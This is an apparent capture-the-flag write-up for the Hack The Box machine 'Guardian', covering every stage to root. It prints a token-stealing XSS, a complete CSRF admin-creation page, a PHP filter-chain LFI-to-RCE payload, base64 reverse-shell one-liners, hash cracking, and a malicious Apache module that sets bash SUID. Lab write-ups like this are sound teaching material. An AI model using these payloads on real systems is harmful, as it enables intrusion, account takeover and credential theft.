---
layout: post
title: "[HTB] Guardian"
description: "[Machine] - Hard difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Hard
---

![](/img/htb_img/Guardian_img/img1.png)

- OS: Linux
- Release Date: 30 Aug 2025
- Difficulty: Hard

<br>

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --min-rate 5000 --open -sS -Pn -n -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 12:18 CEST
Initiating SYN Stealth Scan at 12:18
Scanning 10.129.xx.xx [65535 ports]
Discovered open port 22/tcp on 10.129.xx.xx
Discovered open port 80/tcp on 10.129.xx.xx
Completed SYN Stealth Scan at 12:18, 14.54s elapsed (65535 total ports)
Nmap scan report for 10.129.xx.xx
Host is up, received user-set (0.050s latency).
Scanned at 2025-09-19 12:18:38 CEST for 14s
Not shown: 65242 closed tcp ports (reset), 291 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.61 seconds
           Raw packets sent: 75261 (3.311MB) | Rcvd: 70675 (2.827MB)
```

Scripts and versions.
```
❯ extractPorts allports

[*] Extracting information...

	[*] IP Address: 10.129.xx.xx
	[*] Open ports: 22,80

[*] Ports copied to clipboard

❯ nmap -p22,80 -sCV -Pn -oN targeted $target     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 12:20 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://guardian.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds
```

Domain: `http://guardian.htb/`.
```
❯ echo "$target guardian.htb" | sudo tee -a /etc/hosts
10.129.xx.xx guardian.htb
```
---

# TCP 80: Website
![](/img/htb_img/Guardian_img/img2.png)
![](/img/htb_img/Guardian_img/img3.png)

In the source code we can find another subdomain: `portal.guardian.htb`, so we add it to our `/etc/hosts` file.

![](/img/htb_img/Guardian_img/img4.png)

In the `help` option we have the following default password:
![](/img/htb_img/Guardian_img/img5.png)

> [!NOTE] Info
> GU1234


On the main webpage we can find some students with similar usernames:
![](/img/htb_img/Guardian_img/img6.png)

The first one lets us log in.

> [!NOTE] Credentials
> username: GU0142023
> password: GU1234

![](/img/htb_img/Guardian_img/img7.png)

Inside the portal, in the chat section we can find file transfer IDs in the URL.
```
http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=14
```

So, fuzzing for the IDs we could probably get some conversations maybe?
```
#seq 1 30 > nums

#ffuf -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2' -w nums:FUZZ1 -w nums:FUZZ2 -mode clusterbomb -H 'Cookie: PHPSESSID=opgrd3uodd3lukh5quopdl577g' -fl 178,164

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2
 :: Wordlist         : FUZZ1: /home/dotmuny/Guardian/content/nums
 :: Wordlist         : FUZZ2: /home/dotmuny/Guardian/content/nums
 :: Header           : Cookie: PHPSESSID=opgrd3uodd3lukh5quopdl577g
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 178,164
________________________________________________

[Status: 200, Size: 7306, Words: 3055, Lines: 185, Duration: 3463ms]
    * FUZZ1: 2
    * FUZZ2: 1

[Status: 200, Size: 7302, Words: 3055, Lines: 185, Duration: 4559ms]
    * FUZZ1: 1
    * FUZZ2: 2

:: Progress: [900/900] :: Job [1/1] :: 55 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```

Two possible hits, (2,1),(1,2).
![](/img/htb_img/Guardian_img/img8.png)

We find some credentials:

> [!NOTE] Credentials
> jamil.enockson@guardian.htb
> DHsNnk3V503


This seems to be for a Gitea instance, so let me add it to the hosts file and check if there is a subdomain for this app.

And yes, there is one.

## Gitea

![](/img/htb_img/Guardian_img/img9.png)

Logging in with these credentials allows us to see more of this service.
![](/img/htb_img/Guardian_img/img10.png)

Gitea version 1.23.7. No CVE was found for this specific version.

### Database credentials

![](/img/htb_img/Guardian_img/img11.png)

The credentials for a database were found.

> [!NOTE] Credentials
> root / Gu4rd14n_un1_1s_th3_b3st

## PHPSpreadsheet
![](/img/htb_img/Guardian_img/img12.png)

On the composer file we can find a dependency, `phpspreadsheet` version 3.7.0, which seems to have multiple XSS vulnerabilities. But to get the administrator's token we need to be able to upload files, which can be done through the portal.
![](/img/htb_img/Guardian_img/img13.png)

We can upload `docx and xlsx`.

### Token stealing

https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx
![](/img/htb_img/Guardian_img/img14.png)

This vulnerability is on the `generateNavigation()` function, this is the code from the GitHub:
```
        // Construct HTML
        $html = '';

        // Only if there are more than 1 sheets
        if (count($sheets) > 1) {
            // Loop all sheets
            $sheetId = 0;

            $html .= '<ul class="navigation">' . PHP_EOL;

            foreach ($sheets as $sheet) {
                $html .= '  <li class="sheet' . $sheetId . '"><a href="#sheet' . $sheetId . '">' . $sheet->getTitle() . '</a></li>' . PHP_EOL;
                ++$sheetId;
            }

            $html .= '</ul>' . PHP_EOL;
        }
```


> [!NOTE] Info
> A reflected/stored XSS in PhpSpreadsheet’s HTML writer: when converting an `.xlsx` with multiple sheets to HTML the sheet titles are inserted into the navigation markup **without escaping**, allowing an attacker to craft a sheet name containing JavaScript (e.g. `"><script>…</script>`) which executes when the generated HTML is opened (`Writer\Html::generateHTMLAll()`). Exploitation is trivial — create an XLSX with a malicious sheet title, run the HTML writer (or upload it to a service that does), and the payload runs in the victim’s browser.

We can use FastGrid for this task.
https://www.treegrid.com/FSheet
![](/img/htb_img/Guardian_img/img15.png)

![](/img/htb_img/Guardian_img/img16.png)

So we download it and upload it on the portal, and in our Python server we receive the token:
```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.xx.xx - - [26/Sep/2025 10:43:51] "GET /?c=UEhQU0VTU0lEPTY2N2lkZGYyMWJya2g3MjNtOWhrMjk3Mzlj HTTP/1.1" 200 -
```

# Foothold
## Creating an admin user
```
❯ echo "UEhQU0VTU0lEPTg1ZGltc25hcDMwZWI4Y2FmMzd1MG5hYTV1" | base64 -d
PHPSESSID=85dimsnap30eb8caf37u0naa5u%                         
```

And we are a professor now.
![](/img/htb_img/Guardian_img/img17.png)

At the notice creation form we can see that the administrator reviews the links personally.
![](/img/htb_img/Guardian_img/img18.png)

Reviewing the code from the Gitea instance we can see that the `csrf_token` has no invalidation logic, so by crafting an HTML payload and serving it on a port, we can make the admin load it and then log in as that user.

![](/img/htb_img/Guardian_img/img19.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit</title>
</head>
<body>
<h1>CSRF go brr</h1>
<form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="password" value="P@ssw0rd123">
    <input type="hidden" name="full_name" value="Attacker User">
    <input type="hidden" name="email" value="attacker@example.com">
    <input type="hidden" name="dob" value="1990-01-01">
    <input type="hidden" name="address" value="123 Hackers Street">
    <input type="hidden" name="user_role" value="admin">
    <input type="hidden" name="csrf_token" value="14eba7c35a2d5b7694aa1986efeb1d4a">
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>
</body>
</html>
```

We deliver this file to the admin via Python.
```
python3 -m http.server 80
```

![](/img/htb_img/Guardian_img/img20.png)

Be careful with the value of the csrf_token because if you reload the page it might change, the one on the code needs to be the one on the Notice execution, so use the Inspect tools instead of the view-source code this time.
```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.xx.xx - - [26/Sep/2025 11:04:52] "GET /exploit.html HTTP/1.1" 200 -
```

---

## Logging in as admin user on the portal

> [!NOTE] Admin creds
> username: attacker
> password: P@ssw0rd123

We have a new option: `Reports`, and it has an LFI.
### LFI
Checking the code in Gitea we realize we can use the following to read files:
We can use the `php_filter_chain_generator` from synacktiv.
https://github.com/synacktiv/php_filter_chain_generator

This with the extension Hackbar V2 is very useful to execute commands on the post after php filter chains.

```
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp,system.php


a=system("printf c2ggLWkgPiYgL2Rldi9xx...|base64 -d|bash");
```

```
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.2.15 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/repentance/.penelope/sessions/guardian~10.129.xx.xx-Linux-x86_64/2025_09_26-11_33_49-803.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@guardian:~/portal.guardian.htb/admin$ 
```
And we got a shell.

## Database
Using the DB credentials obtained earlier:

> [!NOTE] DB Creds
> root / Gu4rd14n_un1_1s_th3_b3st

```
www-data@guardian:~/portal.guardian.htb/admin$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 777
Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

```
mysql> select username,password_hash from users;
+--------------------+------------------------------------------------------------------+
| username           | password_hash                                                    |
+--------------------+------------------------------------------------------------------+
| admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 |
| jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 |
| mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e |
| valentijn.temby    | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 |
| leyla.rippin       | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 |
| perkin.fillon      | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 |
| cyrus.booth        | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 |
| sammy.treat        | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 |
| crin.hambidge      | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 |
| myra.galsworthy    | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 |
| mireielle.feek     | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 |
| vivie.smallthwaite | b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a |
| GU0142023          | 5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829 |
| GU6262023          | 87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f |
| GU0702025          | 48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1 |
| GU0762023          | e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2 |
| GU9492024          | 8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1 |
| GU9612024          | cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57 |
| GU7382024          | 7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a |
| GU6632023          | 98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714 |
| GU1922024          | bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd |
| GU8032023          | 41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada |
| GU5852023          | e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a |
| GU0712023          | e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a |
| GU1592025          | 1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71 |
| GU1112023          | 168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d |
| GU6432025          | a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6 |
| GU3042024          | d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab |
| GU1482025          | be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f |
| GU3102024          | 3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706 |
| GU7232023          | 4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6 |
| GU8912024          | 6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51 |
| GU4752025          | 4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a |
| GU9602024          | 6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2 |
| GU4382025          | 8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8 |
| GU7352023          | 8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005 |
| GU3042025          | 1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f |
| GU3872024          | 12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a |
| GU7462025          | 5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa |
| GU3902023          | 6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b |
| GU1832025          | 6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f |
| GU3052024          | 1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f |
| GU3612023          | 7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a |
| GU7022023          | 7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8 |
| GU1712025          | ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225 |
| GU9362023          | 8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592 |
| GU5092024          | 11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380 |
| GU5252023          | 70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa |
| GU8802025          | 7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76 |
| GU2222023          | d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd |
| GU9802023          | a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c |
| GU3122025          | e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a |
| GU2062025          | 0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8 |
| GU3992025          | b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0 |
| GU1662024          | 5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5 |
| GU9972025          | 339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599 |
| GU6822025          | 298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482 |
| GU7912023          | 8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021 |
| GU3622024          | 1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf |
| GU2002023          | 3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2 |
| GU3052023          | 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 |
| GU1462023          | 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 |
+--------------------+------------------------------------------------------------------+
62 rows in set (0.00 sec)
```

Those hashes are built using SHA256 with a salt, and we have it too: `8Sb)tM1vs1SS`.
With a simple script we can get the following:

## Admin and jamil credentials
```
❯ python3 pass_breaker.py
[+] Yoink for admin: fakebake000
[+] Yoink for jamil.enockson: copperhouse56
```

### User flag
```
www-data@guardian:~/portal.guardian.htb/admin$ su jamil
Password: 
jamil@guardian:/var/www/portal.guardian.htb/admin$ cd
jamil@guardian:~$ cat user.txt
<REDACTED>
jamil@guardian:~$ 
```
---


# Lateral Movement
```
jamil@guardian:~$ sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

We got sudo rights on a script.
```
jamil@guardian:~$ cat /opt/scripts/utilities/utilities.py
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status


def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")
    
    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

We are in the `admins` group and we can write to `status.py`:
```sh
jamil@guardian:/opt/scripts/utilities/utils$ ls -lah
total 24K
drwxrwsr-x 2 root root   4.0K Jul 10 14:20 .
drwxr-sr-x 4 root admins 4.0K Jul 10 13:53 ..
-rw-r----- 1 root admins  287 Apr 19 08:15 attachments.py
-rw-r----- 1 root admins  246 Jul 10 14:20 db.py
-rw-r----- 1 root admins  226 Apr 19 08:16 logs.py
-rwxrwx--- 1 mark admins  253 Apr 26 09:45 status.py
jamil@guardian:/opt/scripts/utilities/utils$ id
uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
```

```sh
jamil@guardian:/opt/scripts/utilities/utils$ cat status.py 
def system_status():
    import os
    os.system("printf c2ggLWkgPiYgL2Rldi90Y3AvMTxx...|base64 -d|bash")
```

```sh
jamil@guardian:/opt/scripts/utilities/utils$ sudo -u mark /opt/scripts/utilities/utilities.py system-status


[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 10.0.2.15 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/repentance/.penelope/sessions/guardian~10.129.xx.xx-Linux-x86_64/2025_09_26-11_56_40-526.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
mark@guardian:/opt/scripts/utilities/utils$ 

```

# Privilege Escalation
```sh
mark@guardian:/opt/scripts/utilities/utils$ sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

We can exfiltrate this binary and do some reverse engineering. It reveals that we can elevate privileges as follows:

Evil.c:
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void init() {
    setuid(0);
    system("chmod +s /bin/bash");
}
```

```sh
mark@guardian:~$ cat <<EOF > /home/mark/confs/exploit.conf
LoadModule evil_module /home/mark/confs/evil.so
EOF
```

```sh
mark@guardian:~$ gcc -shared -fPIC -o /home/mark/confs/evil.so /home/mark/evil.c
mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf
apache2: Syntax error on line 1 of /home/mark/confs/exploit.conf: Can't locate API module structure `evil_module' in file /home/mark/confs/evil.so: /home/mark/confs/evil.so: undefined symbol: evil_module
Action '-f /home/mark/confs/exploit.conf' failed.
The Apache error log may have more information.
mark@guardian:~$ ls -lah /bin/bash
-rwsr-xr-x 1 root root 1.4M Mar 14  2024 /bin/bash
mark@guardian:~$ /bin/bash -p
bash-5.1# id
uid=1001(mark) gid=1001(mark) euid=0(root) groups=1001(mark),1002(admins)

```

### Root flag
```bash
bash-5.1# cat /root/root.txt 
<REDACTED>
bash-5.1# 
```